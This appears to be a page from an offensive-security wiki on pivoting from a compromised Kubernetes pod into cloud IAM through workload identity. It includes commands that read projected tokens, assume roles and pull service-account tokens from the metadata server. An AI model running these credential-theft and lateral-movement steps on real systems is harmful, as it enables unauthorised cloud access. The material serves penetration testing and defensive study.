---
title: "Cloud IAM via workload identity: following a pod identity into the cloud"
order: 3
description: "Workload identity features (IRSA on EKS, GKE Workload Identity, Azure AD workload identity) map a Kubernetes service account to a cloud IAM role. A pod using such a service account can obtain the cloud role's credentials through the projected token exchange, so compromising that pod reaches the cloud account at the role's permission level."
keywords:
  - workload identity
  - irsa
  - gke workload identity
  - cloud iam
  - lateral movement
---

# Cloud IAM via workload identity

Managed clusters bind Kubernetes service accounts to cloud IAM roles so pods can call cloud APIs without static keys: AWS IRSA, GKE Workload Identity, and Azure AD workload identity all map a pod's service account to a cloud role. The pod receives a projected, audience-bound token that it exchanges for cloud credentials. For an attacker, compromising a pod that uses such a service account yields the mapped cloud role, and that role is often scoped to real cloud resources (storage, databases, queues), so the move carries the foothold from the cluster into the cloud account.

Detect the mapping and exchange for cloud credentials:

```bash
# AWS IRSA: the webhook injects these into the pod
env | grep -E 'AWS_ROLE_ARN|AWS_WEB_IDENTITY_TOKEN_FILE'
cat $AWS_WEB_IDENTITY_TOKEN_FILE                        # the projected OIDC token
aws sts assume-role-with-web-identity \
  --role-arn "$AWS_ROLE_ARN" --role-session-name x \
  --web-identity-token "$(cat $AWS_WEB_IDENTITY_TOKEN_FILE)"
# the AWS SDK/CLI does this automatically when those env vars are present:
aws sts get-caller-identity

# GKE Workload Identity: reach the GKE metadata server for a token
curl -s -H 'Metadata-Flavor: Google' \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
curl -s -H 'Metadata-Flavor: Google' \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email

# Azure workload identity: exchange the projected token for an AAD token
env | grep -E 'AZURE_CLIENT_ID|AZURE_FEDERATED_TOKEN_FILE|AZURE_TENANT_ID'
```

## Using the cloud role

```bash
export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
aws s3 ls; aws sts get-caller-identity                  # scope = the mapped role
# enumerate what the role can do, then reach the resources it permits
```

## Exploitation notes

- The pod's mapped role is distinct from the node role: workload identity is the pod's own cloud identity, while [Cloud metadata from pod](../cluster-enumeration/cloud-metadata-from-pod.md) is the node's. Check for both; the richer one wins.
- On AWS the injected `AWS_ROLE_ARN` and token file are the tell; the SDK performs the exchange automatically, so simply running `aws` from the pod acts as the role.
- GKE Workload Identity routes through the metadata server but returns the mapped Google service account's token, not the node's; check the `email` endpoint to see which identity you get.
- Mapped roles are frequently over-scoped; enumerate with the cloud provider's IAM simulation or by probing resource reads, then pivot within the cloud account.

## References

- [AWS: IAM roles for service accounts (IRSA)](https://docs.aws.amazon.com/eks/latest/userguide/iam-roles-for-service-accounts.html)
- [GKE: Workload Identity](https://cloud.google.com/kubernetes-engine/docs/concepts/workload-identity)
- [Azure: workload identity](https://azure.github.io/azure-workload-identity/docs/)
